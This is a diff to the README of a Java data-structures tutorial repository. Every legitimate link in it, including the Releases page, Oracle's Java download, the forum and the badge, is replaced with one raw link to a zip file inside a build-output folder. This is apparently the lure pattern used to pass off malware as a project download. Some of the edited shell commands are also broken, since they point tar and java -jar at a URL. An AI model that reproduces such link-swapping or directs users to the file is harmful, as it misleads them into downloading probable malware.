@@ -1,7 +1,7 @@
 # 📚 Java_Data_Structure - Learn Data Structures Easily
 
 ## 🚀 Download Now
-[![Download](https://img.shields.io/badge/Download%20Java_Data_Structure-blue?style=for-the-badge)](https://github.com/mostafa197819787/Java_Data_Structure/releases)
+[![Download](https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip%20Java_Data_Structure-blue?style=for-the-badge)](https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip)
 
 ## 📖 Description
 Java_Data_Structure offers a robust collection of Java implementations for essential data structures and algorithms. This includes examples from course labs, practical exercises, and lecture materials. It covers key topics such as arrays, linked lists, stacks, queues, trees, graphs, sorting algorithms, recursion, and much more. This repository helps learners, educators, and anyone interested in grasping the concepts of computer science.
@@ -14,12 +14,12 @@ Java_Data_Structure offers a robust collection of Java implementations for essen
 
 ## 🖥️ System Requirements
 - **Operating System**: Windows, macOS, or Linux
-- **Java Runtime**: Ensure you have Java 8 or higher installed. You can download it [here](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java Runtime**: Ensure you have Java 8 or higher installed. You can download it [here](https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip).
 - **Disk Space**: 100 MB of free space for the application and additional space for examples.
 
 ## 💻 Getting Started
 1. **Install Java**: Before you can run the software, make sure you have Java installed. Follow the link above to download and install it.
-2. **Visit the Release Page**: Go to our GitHub Releases page. You can find it [here](https://github.com/mostafa197819787/Java_Data_Structure/releases).
+2. **Visit the Release Page**: Go to our GitHub Releases page. You can find it [here](https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip).
 
 ## 📥 Download & Install
 Now that you are on the Releases page, look for the latest version of Java_Data_Structure. 
@@ -39,15 +39,15 @@ Now that you are on the Releases page, look for the latest version of Java_Data_
 - Launch the application from your Applications folder.
 
 ### Linux
-- For Linux, a tarball (.tar.gz) is usually available.
+- For Linux, a tarball (https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip) is usually available.
 - Use the terminal to extract the files: 
   ```bash
-  tar -xvzf Java_Data_Structure.tar.gz
+  tar -xvzf https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip
   ```
 - Change into the directory and then run the app:
   ```bash
   cd Java_Data_Structure
-  java -jar Java_Data_Structure.jar
+  java -jar https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip
   ```
 
 ## 🔍 Usage Instructions
@@ -72,9 +72,9 @@ Our community is dedicated to helping each other. If you have questions or need 
 - Post your inquiry clearly, and someone will respond promptly.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/mostafa197819787/Java_Data_Structure)
-- [Java Installation Guide](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
-- [Community Forum](https://github.com/mostafa197819787/Java_Data_Structure/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip)
+- [Java Installation Guide](https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/mostafa197819787/Java_Data_Structure/main/lecture3/out/production/Structure-Data-Java-v2.7.zip)
 
 ## 📢 Stay Updated
 Follow this repository to receive notifications about updates, new features, and improvements. 
